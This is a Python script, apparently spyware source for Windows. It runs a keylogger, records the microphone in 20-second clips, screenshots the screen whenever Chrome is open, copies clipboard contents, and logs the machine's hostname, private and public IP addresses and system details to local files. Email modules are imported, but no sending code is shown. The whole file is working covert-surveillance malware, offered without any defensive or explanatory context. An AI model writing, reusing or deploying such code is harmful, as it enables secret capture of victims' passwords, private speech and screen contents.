# librabirs

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from multiprocessing import Process
import sys
import socket
import platform

from PIL import ImageGrab
import psutil
import subprocess

import threading

import win32clipboard

from pynput.keyboard import Key, Listener

import os
import time

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = 'key_log.txt'
keys = []
count = 0
file_path1 = "F:\\All in one\\Hook\\Python\\SS"
try:
    os.mkdir(file_path1)
except:
    pass

file_path2 = "F:\\All in one\\Hook\\Python\\Rec"
try:
    os.mkdir(file_path2)
except:
    pass

file_path = "F:\\All in one\\Hook\\Python"
extend = "\\"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
#audio_information = "audio.wav"
time_iteration = 20
num = 0
microphone_time = time_iteration


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address:" + public_ip)
        except Exception:
            f.write("Couldn;t get Public ip Adress (most max query")

        f.write("Process: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP address: " + IPaddr + '\n')


computer_information()


def copy_clipbord():
    with open(file_path + extend + clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")
    time.sleep(1)


def microphone():
    global num
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path2 + extend + ('Rec' + str(num) + '.wav'), fs, myrecording)
    num += 1
    time.sleep(20)
    #microphon()


def keylogger():
    while True:

        # keys = []

        def on_press(key):
            global keys, count

            print(key)
            keys.append(key)
            count += 1
            # current_T = time.time()

            if count >= 1:
                count = 0
                write_file(keys)
                keys = []

        def write_file(keys):
            with open(file_path + extend + keys_information, 'a') as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()

        def on_release(key):
            if key == Key.esc:
                return False

        with Listener(on_press=on_press, on_release=on_release) as l:
            l.join()
        time.sleep(1)


def s_s():
    def checkIfProcessRunning(processName):

        for proc in psutil.process_iter():
            try:
                # Check if process name contains the given name string.
                if processName.lower() in proc.name().lower():
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return False;

    cnt = 0
    while True:
        x = checkIfProcessRunning('chrome.exe')
        if x == True:
            im = ImageGrab.grab()
            im.save(file_path1 + extend + ('SS' + str(cnt) + '.png'))
            cnt += 1
            print('Taken', cnt)
            time.sleep(5)
    time.sleep(1)


t1 = threading.Thread(target=keylogger)
t2 = threading.Thread(target=microphone)
t3 = threading.Thread(target=s_s)
t4 = threading.Thread(target=copy_clipbord)

t1.start()
t2.start()
t3.start()
t4.start()
t4.join()
t3.join()
t2.join()
t1.join()

